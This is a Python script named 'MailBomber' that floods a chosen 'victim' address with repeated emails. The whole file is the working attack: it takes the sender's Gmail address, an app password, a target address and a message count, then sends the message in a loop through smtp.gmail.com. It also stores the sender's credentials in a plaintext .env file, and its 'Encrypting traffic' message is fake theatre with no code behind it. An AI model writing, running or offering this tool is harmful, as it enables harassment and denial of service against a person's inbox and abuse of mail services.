# Author: 0xJuaNc4

# Modules
import os
import smtplib
from dotenv import load_dotenv
from time import sleep

# Color palette
class Colors:
    GREEN = "\033[92m"
    RED = "\033[91m"
    PURPLE = "\033[35m"
    YELLOW = "\033[33m"
    RESET = "\033[0m"

# Banner
def banner():
    os.system("cls" if os.name == "nt" else "clear")
    print(f"""{Colors.PURPLE}
    ╭━╮╭━╮╱╱╱╭╮╭━━╮╱╱╱╱╱╱╭╮
    ┃┃╰╯┃┃╱╱╱┃┃┃╭╮┃╱╱╱╱╱╱┃┃
    ┃╭╮╭╮┣━━┳┫┃┃╰╯╰┳━━┳╮╭┫╰━┳━━┳━╮
    ┃┃┃┃┃┃╭╮┣┫┃┃╭━╮┃╭╮┃╰╯┃╭╮┃┃━┫╭╯  {Colors.RESET}(Made by {Colors.YELLOW}0xJuaNc4{Colors.RESET}){Colors.PURPLE}
    ┃┃┃┃┃┃╭╮┃┃╰┫╰━╯┃╰╯┃┃┃┃╰╯┃┃━┫┃
    ╰╯╰╯╰┻╯╰┻┻━┻━━━┻━━┻┻┻┻━━┻━━┻╯
    {Colors.RESET}""")
    sleep(1)

# Email bomber
def send_email():
    num_counter = 0
    sender_email = str(input(f"\n{Colors.YELLOW}[*]{Colors.RESET} Enter your email address: "))
    sender_passwd = str(input(f"\n{Colors.YELLOW}[*]{Colors.RESET} Enter the application password: "))
    victim_email = str(input(f"\n{Colors.YELLOW}[*]{Colors.RESET} Enter the victim's e-mail address: "))
    message = input(f"\n{Colors.YELLOW}[*]{Colors.RESET} Enter the message to send: ")
    try:
        counter = int(input(f"\n{Colors.YELLOW}[*]{Colors.RESET} Number of emails to be sent: "))
    except ValueError:
        print(f"\n{Colors.RED}[!]{Colors.RESET} Invalid entry, try again with a number")
        return
    print(f"\n{Colors.YELLOW}[*]{Colors.RESET} Generating {Colors.YELLOW}.env{Colors.RESET} file with entered data")
    with open(".env", "w") as env_file:
        env_file.write(f"USER={sender_email}\n")
        env_file.write(f"PASS={sender_passwd}")
    sleep(2)
    print(f"\n{Colors.GREEN}[*]{Colors.RESET} {Colors.YELLOW}.env{Colors.RESET} file successfully created!")
    load_dotenv()
    sleep(2)
    banner()
    print(f"\n{Colors.YELLOW}[*]{Colors.RESET} Summary of the attack:")
    print(f"\n{Colors.PURPLE}Sender:{Colors.RESET} {sender_email}\n{Colors.PURPLE}Target:{Colors.RESET} {victim_email}\n{Colors.PURPLE}Number of mailings:{Colors.RESET} {counter}")
    sleep(3)
    print(f"\n{Colors.YELLOW}[*]{Colors.RESET} Encrypting traffic...")
    sleep(2)
    print(f"\n{Colors.YELLOW}[*]{Colors.RESET} Starting the attack...")
    sleep(2)
    banner()
    try:
        for i in range(counter):
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(os.getenv("USER"), os.getenv("PASS"))
            server.sendmail(os.getenv("USER"), victim_email, message)
            num_counter+=1
            print(f"\r{Colors.GREEN}[*]{Colors.RESET} Successfully sent mail: {Colors.YELLOW}{num_counter}{Colors.RESET}", end="", flush=True)
            if counter == num_counter:
                print(f"\n\n{Colors.YELLOW}[*]{Colors.RESET} {num_counter} emails successfully sent to {Colors.PURPLE}{victim_email}{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.RED}[!]{Colors.RESET} The information entered is incorrect, the attack cannot be carried out.")
        print(e)
    
# Main program
if __name__ == "__main__":
    try:
        banner()
        send_email()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.RED}[!]{Colors.RESET} Exit...")
    finally:
        try:
            os.remove(".env")
        except:
            pass
